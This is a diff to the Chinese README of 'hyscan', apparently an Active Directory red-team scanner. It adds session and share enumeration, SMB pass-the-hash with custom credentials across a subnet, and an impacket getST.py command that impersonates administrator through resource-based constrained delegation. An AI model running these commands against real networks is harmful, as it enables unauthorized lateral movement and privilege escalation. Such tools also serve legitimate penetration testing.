@@ -24,13 +24,14 @@
   - [√] 基于 LDAP DNS记录搜集
   - [√] 基于 端口开放扫描(服务指纹识别)
   - [√] 基于 WEB服务标题扫描
-  - [ ] 基于 共享资源枚举NetShareEnum
-  - [ ] 基于 域管登录定位NetSession
+  - [√] 基于 共享资源枚举NetShareEnum
+  - [√] 基于 共享会话枚举NetSessionEnum
+  - [√] 基于 注册表枚举登录会话(定位高权限，PC机器无法利用，只能在server机器上使用)
 - 利用(Exploit)
   - [√] 基于 IPC Brute(域/本地组弱口令自动枚举)
   - [ ] 基于 WMIC Brute(域/本地组弱口令自动枚举)
-  - [√] 基于 Default WMI PTH
-  - [√] 基于 Default SMB PTH
+  - [√] 基于 Self WMI PTH
+  - [√] 基于 Self/Other SMB PTH
   - [√] 基于 LDAP 利用（添加机器用户/添加DNS记录/基于资源的约束委派利用和提权）
   - [ ] 基于 TCP加密流量代理
   - [ ] 基于 kerberos TGT票据请求
@@ -81,7 +82,7 @@ SMB的type 2 445端口也是一样的，只需要如下即可
 
 ### 基于 LDAP 委派配置不当探测（约束委派/非约束委派/基于资源的约束委派）
 
-`hyscan.exe --scantype ldapscan --dc 192.168.4.11 --`
+`hyscan.exe --scantype ldapscan --dc 192.168.4.11 --searchDelegation --dc 192.168.4.11 --domainName hengge.com`
 
 ![ldapscan-searchdele](img/ldapscan-searchdele.png)
 
@@ -105,7 +106,7 @@ SMB的type 2 445端口也是一样的，只需要如下即可
 
 ![ldapscan-rbcd](img/ldapscan-rbcd.png)
 
-之后利用的话就直接用impacket的getST.py进行申请参数为paname的主机的TGS(ST)票据然后被接管的主机就可以了
+之后利用的话就直接用impacket的getST.py进行申请参数为pcname的主机的TGS(ST)票据然后被接管的主机就可以了
 
 `python getST.py -dc-ip 192.168.4.11 hengge.com/新加的机器名$:新加的机器密码 -spn cifs/被设置了接管msds-allowedtoactonbehalfofotheridentity的主机名 -impersonate administrator`
 
@@ -250,6 +251,30 @@ PTH的时候建议不要用WMI，我这里写的WMI有问题，WINDOWS COM组件
 
 ![pthscan-wmi](img/pthscan-wmi.png)
 
+加上了一个支持SMB自定义账号密码的PTH
+
+`hyscan.exe --scantype pthscan --pthtype smb --cidr 192.168.4.1/24 --pthusername prjadm --pthpassword admin@123 --thread 100`
+
+![pthscan-smb-option](img/pthscan-smb-option.png)
+
+### 基于net枚举的相关
+
+网络会话枚举
+
+`hyscan.exe --scantype netscan --nettype getNetSession --cidr 192.168.4.1/24`
+
+![netscan-netsessionenum](img/netscan-netsessionenum.png)
+
+注册表会话记录枚举
+
+`hyscan.exe --scantype netscan --nettype getLoggedUsers --cidr 192.168.4.1/24`
+
+![netscan-netlogged](img/netscan-netlogged.png)
+
+网络共享资源枚举
+
+`hyscan.exe --scantype netscan --nettype getNetShare --cidr 192.168.4.1/24`
+
 ## 参考
 
 https://github.com/0x727/ShuiYing_0x727
@@ -262,6 +287,10 @@ https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-
 
 https://github.com/robertdavidgraham/masscan
 
+https://www.cnblogs.com/unicodeSec/p/15348117.html
+
+https://www.4hou.com/posts/GzD3
+
 ## 参考
 
 2022.1.22变动
@@ -271,3 +300,16 @@ https://github.com/robertdavidgraham/masscan
 2)实战的时候wmi/smb探测ntlm type2的时候速度太慢，加上了先发送arp进行探测存活再进行ntlm通信
 
 3)修复了下smb ntlm type2探测的bug
+
+2022.1.27变动
+
+1)把域管登录定位NetSession代码补上了
+
+2)遇到的情况，有时候不出网，不好上线到cs/msf上，这里PTH的话，就需要用其他工具来实现，所以这里的话再加上PTH的自定义账号和密码的横向
+
+3)本地组弱口令自动枚举的功能又改了下，忽略了一种情况就是本地组中除了本身域用户的其他域用户的情况下，这里代码补上
+
+2022.1.28变动
+
+1)本地组弱口令自动枚举改了点代码，忽略了一种情况就是环境中的管理员组不一定是"administrators"，有可能是"admins"等等之类的，这里用samr相关的方法来进行获取，通过固定的RID 544来获取就可以解决了
+
